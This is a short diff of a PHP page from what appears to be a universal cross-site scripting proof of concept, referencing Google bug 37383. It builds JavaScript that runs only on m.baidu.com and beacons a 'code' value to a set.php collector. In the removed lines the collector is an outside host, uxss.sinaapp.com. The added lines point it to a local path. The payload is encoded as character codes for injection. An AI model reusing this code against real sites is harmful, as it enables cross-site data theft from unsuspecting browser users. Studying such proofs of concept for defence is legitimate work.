@@ -3,18 +3,19 @@
 // google漏洞编号 37383
 ?>
 <?php
-$code = htmlspecialchars(strip_tags($_GET['code']),ENT_QUOTES);
-$str = "if(document.domain == 'm.baidu.com'){new Image().src='http://uxss.sinaapp.com/set.php?code=".$code."& =2';}";
-//$str = "if(document.domain == 'm.baidu.com'){alert(1)}";
 
-$tmp = str_split($str);
-$result = array();
+    $code = htmlspecialchars(strip_tags($_GET['code']), ENT_QUOTES);
+    $str = "if(document.domain == 'm.baidu.com'){new Image().src='php/set.php?code=".$code."&suc=2';}";
+    //$str = "if(document.domain == 'm.baidu.com'){alert(1)}";
 
-foreach($tmp as $key => $value){
-    $result[$key] = ord($value);
-}
+    $tmp = str_split($str);
+    $result = array();
 
-$input = implode(",", $result);
+    foreach($tmp as $key => $value){
+        $result[$key] = ord($value);
+    }
+
+    $input = implode(",", $result);
 
 ?>
 <script>
